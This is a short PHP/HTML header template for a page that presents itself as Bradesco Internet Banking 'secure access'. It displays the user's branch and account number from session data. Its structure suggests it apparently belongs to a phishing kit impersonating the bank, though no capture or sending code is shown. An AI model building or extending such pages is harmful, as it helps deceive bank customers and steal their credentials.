<div class="hd_logo">
	<img src="../_images/ibi/<?php echo $logo_quad; ?>" alt="">
</div><!-- hd_logo -->

<div class="hd_info_all">
	<div class="block_acess">
		<span>Agência: <b><?= $_SESSION['Agencia'];?></b></span>
		<span>Conta: <b><?= $_SESSION['Conta'];?>-<?= $_SESSION['Digito'];?></b></span>
		<div class="hd_closeButton">
			<img src="../_images/ibi/btn_exit.jpg" class="J_Cancel">
		</div><!-- hd_closeButton -->
	</div><!-- block_acess -->

	<div class="block_time">
		<?= getDataShow();?>
	</div><!-- block_time -->
	<div class="block_info">
		<h1>Acesso Seguro</h1>
		<p>Acesse o Bradesco Internet Banking de forma segura seguindo os passos abaixo:</p>
	</div><!-- block_info -->
</div><!-- hd_info_all -->


